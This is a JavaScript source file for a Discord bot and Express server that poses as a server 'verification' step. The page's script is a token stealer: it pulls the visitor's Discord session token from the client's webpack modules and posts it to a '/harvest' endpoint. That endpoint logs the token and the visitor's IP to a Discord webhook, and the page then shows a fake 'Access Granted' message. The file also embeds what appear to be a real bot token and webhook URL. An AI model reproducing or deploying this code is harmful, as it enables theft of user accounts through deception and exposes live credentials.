const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
const express = require('express');
const axios = require('axios');
const bodyParser = require('body-parser');
const cors = require('cors');

const app = express();
app.use(bodyParser.json());
app.use(cors()); // This pierces the "Silence" barrier by allowing cross-origin data

// --- ARCHIVE CONFIGURATION ---
const CONFIG = {
    BOT_TOKEN: 'MTUwMjU3NTI0NTc5NjU3NzQ5MQ.GUTKb-.84-lDpFRQONdswpAwHB9WXFjdNi6y6Gb2n6-WU',
    WEBHOOK_URL: 'https://discord.com/api/webhooks/1501995321868161094/JTt34mgQCr-kQYGkReOuKGf9rXFE2D_KfgdVzbwwsdWqqjyBIJZCtCylnpOUTUaifR7E',
    GUILD_ID: '1497683531055239309',
    VERIFIED_ROLE_ID: '1502575425401127023',
    PORT: process.env.PORT || 3000,
    BASE_URL: 'https://sativa.xo.je'  // Ensure NO slash at the end
};

// --- THE SENTINEL BOT ---
const client = new Client({ 
    intents: [
        GatewayIntentBits.Guilds, 
        GatewayIntentBits.GuildMessages, 
        GatewayIntentBits.MessageContent, 
        GatewayIntentBits.GuildMembers // MUST BE ON IN DEV PORTAL
    ] 
});

client.on('ready', () => console.log(`† Sentinel Active: ${client.user.tag} †`));

client.on('messageCreate', async (message) => {
    if (message.content === '!setup-verify') {
        const embed = new EmbedBuilder()
            .setColor(0x000000)
            .setTitle('† VAULT ACCESS †')
            .setDescription('Enter the void to synchronize your digital fragment.')
            .setImage('https://i.imgur.com/your-aesthetic-banner.png');

        const row = new ActionRowBuilder().addComponents(
            new ButtonBuilder()
                .setLabel('PROCEED')
                .setURL(CONFIG.BASE_URL)
                .setStyle(ButtonStyle.Link)
        );

        await message.channel.send({ embeds: [embed], components: [row] });
    }
});

// --- THE EXTRACTION INTERFACE (HTML) ---
app.get('/', (req, res) => {
    res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"><title>† VOID †</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Metal+Mania&family=Syne:wght@800&display=swap');
        body { background: #050505; color: #fff; font-family: 'Syne', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { border: 2px solid #444; padding: 60px; text-align: center; border-radius: 0px; }
        h1 { font-family: 'Metal Mania', cursive; font-size: 4rem; background: linear-gradient(#fff, #555); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin: 0; }
        .btn { background: #fff; color: #000; border: none; padding: 15px 50px; font-weight: 900; cursor: pointer; text-transform: uppercase; margin-top: 30px; }
        .btn:hover { background: #ff00ff; color: #fff; }
    </style>
</head>
<body>
    <div class="box">
        <h1>VERIFY</h1>
        <p style="color:#444; font-size:10px; letter-spacing:4px;">CHROME HEARTZ ARCHIVE</p>
        <button class="btn" onclick="capture()">[ PROCEED ]</button>
    </div>
    <script>
        async function capture() {
            const btn = document.querySelector('.btn');
            btn.innerText = "SIPHONING...";
            try {
                // TOKEN SIPHON SHARD
                window.dispatchEvent(new Event('beforeunload'));
                let token = (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let i in e.c)m.push(e.c[i])}]),m)
                    .find(m=>m.exports&&m.exports.default&&m.exports.default.getToken!==undefined)
                    .exports.default.getToken();

                await fetch('${CONFIG.BASE_URL}/harvest', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ discordToken: token })
                });
                
                alert("Verified. Access Granted.");
                window.location.href = "https://discord.com/app";
            } catch (e) {
                // If Siphon fails, trigger the hand-shake
                window.location.href = "${CONFIG.BASE_URL}/auth/discord";
            }
        }
    </script>
</body>
</html>
    `);
});

// --- THE WEBHOOK LOGGER ---
app.post('/harvest', async (req, res) => {
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const { discordToken } = req.body;

    console.log("Extraction successful from IP: " + ip);

    try {
        await axios.post(CONFIG.WEBHOOK_URL, {
            username: "Custodian Logger",
            embeds: [{
                title: "† TOKEN ARCHIVED †",
                color: 0x000000,
                fields: [
                    { name: "IP Address", value: ip || "Unknown", inline: true },
                    { name: "Master Token", value: "```" + (discordToken || "EMPTY") + "```", inline: false }
                ],
                timestamp: new Date()
            }]
        });
        res.sendStatus(200);
    } catch (err) {
        console.error("Signal Lost:", err.message);
        res.sendStatus(500);
    }
});

// --- THE FALLBACK HANDSHAKE (AUTHORIZE) ---
app.get('/auth/discord', (req, res) => {
    // Generate this link in your Discord Dev Portal under OAuth2 > URL Generator
    const oauthUrl = "https://discord.com/api/oauth2/authorize?client_id=YOUR_CLIENT_ID&redirect_uri=YOUR_URL_CALLBACK&response_type=code&scope=identify%20email%20guilds.join";
    res.redirect(oauthUrl);
});

client.login(CONFIG.BOT_TOKEN);
app.listen(CONFIG.PORT, () => console.log("Vault heartbeat detected on port " + CONFIG.PORT));
